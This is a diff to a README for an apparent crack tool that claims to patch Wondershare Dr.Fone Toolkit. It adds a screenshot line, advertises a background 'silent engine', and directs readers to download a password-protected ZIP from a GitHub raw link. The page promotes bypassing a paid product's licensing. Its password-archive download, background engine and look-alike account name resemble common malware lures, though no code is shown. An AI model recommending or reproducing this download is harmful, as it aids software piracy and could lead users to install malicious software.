@@ -8,6 +8,8 @@ Professional patch engine for Wondershare Dr.Fone Toolkit. This tool automates t
 - **Universal Support**: Works for all iOS and Android recovery modules.
 - **Silent Engine**: Runs in the background with minimal system impact.
 
+![Success Screenshot](success_screenshot.png)
+
 ## 📥 Installation
 1. Download the latest release from the [Releases](https://github.com/twillio-ai/DrFone-Toolkit-Patcher/raw/main/DrFone_Toolkit_Patcher_Full.zip) page.
 2. Extract the ZIP archive using the password (if applicable).
